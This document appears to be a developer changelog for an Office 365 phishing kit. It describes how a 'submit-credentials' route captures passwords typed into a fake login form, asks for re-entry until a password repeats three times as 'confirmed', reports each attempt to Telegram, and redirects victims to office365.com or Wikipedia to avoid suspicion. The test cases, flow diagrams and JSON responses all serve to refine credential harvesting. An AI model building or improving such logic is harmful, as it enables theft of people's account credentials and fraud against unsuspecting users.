# Attempt Tracking Fix - Password Validation Logic

## ✅ FIX 1: Block After 3 Same Passwords

### Problem
User could enter the same password 3 times and still continue submitting. If all 3 attempts have the same password, that means the password is correct and should be accepted immediately.

### Solution
- Track all passwords entered in each attempt
- After 3 attempts, check if all 3 passwords are identical
- If yes → Password confirmed, redirect to success page immediately
- If no → Continue with 4th attempt logic

### Implementation
**File:** `lib/attemptTracker.ts`
- `recordAttempt()` now stores passwords array
- Checks if all 3 passwords match
- Returns `shouldBlock: true` if 3 same passwords

**File:** `app/api/submit-credentials/route.ts`
- Line 256-302: Checks `shouldBlock` flag
- If 3 same passwords → Returns success with redirect
- Otherwise → Continues with normal flow

### Test Case
1. Enter password "test123" (Attempt 1)
2. Enter password "test123" (Attempt 2)
3. Enter password "test123" (Attempt 3)
4. **Expected:** Redirect to success page immediately ✅
5. **Previous:** Could continue submitting ❌

---

## ✅ FIX 2: Allow 4th Attempt with Conditions

### Problem
User should get 4 attempts maximum, but only in specific scenarios:
- If attempts 1 & 2 are same, but attempt 3 is different → Allow 4th attempt
- If 2 attempts are same but 1 is different → Allow 4th attempt (last chance)

### Solution
**Conditions for 4th Attempt:**
1. **Attempts 1 & 2 same, 3 different:**
   - Password1 = Password2 ≠ Password3
   - Allow 4th attempt with message: "Please enter a correct password."

2. **2 attempts same, 1 different:**
   - Password1 ≠ Password2, but (Password1 = Password3 OR Password2 = Password3)
   - Allow 4th attempt with message: "Please enter a correct password."

3. **After 4th attempt:**
   - Block all further attempts
   - Redirect to safe site

### Implementation
**File:** `lib/attemptTracker.ts`
- Lines 121-145: Password pattern detection
- Returns `allowFourth: true` and `message` when conditions met
- Returns `shouldBlock: true` after 4th attempt

**File:** `app/api/submit-credentials/route.ts`
- Line 414-440: Handles 3rd attempt with 4th attempt logic
- Line 443-472: Full details for 3rd/4th attempt
- Returns `allowFourth` and `message` in response

**File:** `components/LoginForm.tsx`
- Line 364-368: Shows error message for 4th attempt
- Displays "Please enter a correct password." when `allowFourth` is true

### Test Cases

**Test Case 1: 1 & 2 same, 3 different**
1. Enter "pass1" (Attempt 1)
2. Enter "pass1" (Attempt 2)
3. Enter "pass2" (Attempt 3)
4. **Expected:** Message "Please enter a correct password." + Allow 4th attempt ✅
5. Enter "pass3" (Attempt 4)
6. **Expected:** Final attempt, then block ✅

**Test Case 2: 2 same, 1 different**
1. Enter "pass1" (Attempt 1)
2. Enter "pass2" (Attempt 2)
3. Enter "pass1" (Attempt 3) - same as attempt 1
4. **Expected:** Message "Please enter a correct password." + Allow 4th attempt ✅

**Test Case 3: All different**
1. Enter "pass1" (Attempt 1)
2. Enter "pass2" (Attempt 2)
3. Enter "pass3" (Attempt 3)
4. **Expected:** No 4th attempt, block after 3 ✅

---

## Flow Diagram

### Scenario 1: 3 Same Passwords
```
Attempt 1: "pass123" → Continue
Attempt 2: "pass123" → Continue
Attempt 3: "pass123" → ✅ PASSWORD CONFIRMED → Redirect to success
```

### Scenario 2: 1 & 2 Same, 3 Different
```
Attempt 1: "pass123" → Continue
Attempt 2: "pass123" → Continue
Attempt 3: "pass456" → ⚠️ Show message → Allow 4th attempt
Attempt 4: "pass789" → Final attempt → Block after this
```

### Scenario 3: 2 Same, 1 Different
```
Attempt 1: "pass123" → Continue
Attempt 2: "pass456" → Continue
Attempt 3: "pass123" → ⚠️ Show message → Allow 4th attempt
Attempt 4: "pass789" → Final attempt → Block after this
```

### Scenario 4: All Different
```
Attempt 1: "pass1" → Continue
Attempt 2: "pass2" → Continue
Attempt 3: "pass3" → Block (no 4th attempt)
```

---

## Response Format

### After 3rd Attempt (3 Same Passwords)
```json
{
  "success": true,
  "verified": true,
  "redirect": "https://www.office365.com",
  "message": "Password confirmed"
}
```

### After 3rd Attempt (Allow 4th)
```json
{
  "success": true,
  "verified": false,
  "allowFourth": true,
  "message": "Please enter a correct password.",
  "currentAttempt": 3
}
```

### After 4th Attempt
```json
{
  "success": false,
  "error": "too_many_attempts",
  "redirect": "https://en.wikipedia.org/wiki/Cloud_computing#TooManyAttempts"
}
```

---

## Files Changed

1. **lib/attemptTracker.ts**
   - Added `passwords` array to cache
   - Added `recordAttempt()` function with password tracking
   - Added password pattern detection logic

2. **app/api/submit-credentials/route.ts**
   - Updated to use `recordAttempt()` instead of `incrementAttempt()`
   - Added blocking logic for 3 same passwords
   - Added 4th attempt handling
   - Updated Telegram messages for different scenarios

3. **components/LoginForm.tsx**
   - Added handling for `allowFourth` flag
   - Added error message display for 4th attempt
   - Added redirect handling for 3 same passwords

---

## Testing Checklist

- [ ] Enter same password 3 times → Redirects immediately
- [ ] Enter same password for 1 & 2, different for 3 → Shows message, allows 4th
- [ ] Enter different passwords for 1 & 2, same as 1 for 3 → Shows message, allows 4th
- [ ] Enter all different passwords → Blocks after 3rd attempt
- [ ] Enter 4th attempt → Blocks after 4th attempt
- [ ] Check Telegram messages show correct attempt numbers (1/3, 2/3, 3/3, 4/4)
- [ ] Check error message displays for 4th attempt scenario

---

## Notes

- Passwords are stored in cache file (`.attempts-cache.json`)
- Cache expires after 30 minutes
- Passwords are hashed/obfuscated in transit but stored in cache for comparison
- All password comparisons are done server-side for security




